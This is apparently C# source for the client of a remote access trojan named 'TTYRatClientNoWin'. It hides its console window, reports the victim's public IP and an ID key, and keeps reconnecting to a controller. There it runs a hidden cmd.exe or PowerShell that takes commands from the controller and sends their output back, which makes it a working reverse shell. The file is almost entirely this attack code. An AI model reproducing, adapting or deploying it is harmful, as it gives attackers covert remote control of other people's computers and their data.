using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TTYRatClientNoWin
{
    class Program
    {
        
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
            
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hwd,int cmdShow);
        
        static void Main(string[] args)
        {
            
            IntPtr hwd = GetConsoleWindow();
            ShowWindow(hwd,0);
            Shell shell = new Shell();
            shell.Start();
        }
    }

    public class Shell
    {
        
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        public static string publicIP = getPublicIP();
        private string remoteIp = "127.0.0.1";
        private int mainPort = 56;
        protected ulong idKey = genKey();
        

        
        public void Start()
        {
            while (true)
            {
                
                RunServer(remoteIp, mainPort);
                System.Threading.Thread.Sleep(1000); //Wait 5 seconds//then try again 
            }
        }

        private void RunServer(string ip, int port)
        {
            
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {                   
                    tcpClient.Connect(ip, port);
                    
                }
                catch (Exception ) { return; } //if no Client don't continue

                networkStream = tcpClient.GetStream();
                streamReader = new StreamReader(networkStream);
                streamWriter = new StreamWriter(networkStream);
                byte[] msgToSend = ASCIIEncoding.ASCII.GetBytes(publicIP + ':' + idKey + ':');
                Console.WriteLine(publicIP + ":" + idKey );
                networkStream.Write(msgToSend,0,msgToSend.Length);

                
                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += CmdOutputDataHandler;
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    string cmd = strInput.ToString();
                   // if (cmd.Contains("change " ))
                    {
                        
                    }
                    // else
                    {
                        
                        //   AJOUT DE COMMANDE //
                        if (strInput.ToString().LastIndexOf("powershell", StringComparison.Ordinal) >= 0) openApp();
                        
                        
                    
                        //   AJOUT DE COMMANDE //
                        processCmd.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                    
                }
                catch (Exception )
                {
                    //Cleanup();
                    break;
                }
            }
            
        }

        
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        
        public static string getPublicIP()
        {
            bool connected = false;
            while (!connected)
            {
                connected = CheckForInternetConnection();
            }
            String address = "";  
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");  
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }
            int first = address.IndexOf("Address: ") + 9;  
            int last = address.LastIndexOf("</body>");  
            address = address.Substring(first, last - first);
            return address;
        }
        
        
        private void openApp()
        {
            processCmd.StandardInput.WriteLine("powershell");
        }
        
        /*
        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception ) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }
*/
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ) { }

            }
        }
        
        public static ulong genKey()
        {
            DateTime date = DateTime.Now;
            string keyStr = date.ToString(); 
            keyStr = keyStr.Replace('/', ' ');
            keyStr = keyStr.Replace(':', ' ');
            keyStr = keyStr.Replace(" ", "");
            Random rdm = new Random();
            ulong salt = Convert.ToUInt64(rdm.Next(0, rdm.Next()));
            ulong key = UInt64.Parse(keyStr) * salt;
            return(key);
        }

        public static void encrypt()
        {
            
        }
        
    }
}

